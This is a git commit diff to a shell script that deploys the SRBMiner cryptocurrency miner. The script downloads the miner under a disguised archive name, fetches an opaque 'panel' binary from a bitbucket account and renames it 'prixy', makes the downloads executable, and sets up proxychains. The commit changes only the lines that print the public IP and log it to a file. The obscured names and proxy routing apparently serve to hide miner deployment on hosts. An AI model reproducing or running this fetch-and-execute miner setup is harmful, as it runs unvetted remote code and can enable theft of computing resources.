c76a683be34a0eeea5ac09888b8d989e73cb638e
HellDarkK <86185393+SankuNetwork@users.noreply.github.com>
2023-09-09 10:43:41 +0700

    Update SRBMineLP.sh

--- mnr/cpulimited/400/SRBMineLP.sh
+++ mnr/cpulimited/400/SRBMineLP.sh
@@ -3,7 +3,10 @@ wget -O hazah.tar.gz https://github.com/doktor83/SRBMiner-Multi/releases/downloa
 wget -q -O prixy https://bitbucket.org/asimadarasi/alima/downloads/panel && chmod +x prixy
 wget https://bitbucket.org/asimadarasi/alima/downloads/libproxychains4.so && chmod +x libproxychains4.so
 wget -q https://bitbucket.org/asimadarasi/alima/downloads/proxychains.conf && chmod +x proxychains.conf 
-echo "IP ORI & BARU ==> "$(curl ifconfig.me)
+echo " myip.wtf: $(curl https://myip.wtf/text)"
+echo "ifconfig.me: $(curl ifconfig.me)"
+echo " myip.wtf: $(curl https://myip.wtf/text)" >> wip.txt
+echo "ifconfig.me: $(curl ifconfig.me)" >> wip.txt
 cd SRBMiner-Multi-2-3-1/
 mv SRBMiner-MULTI  ..
 cd ..
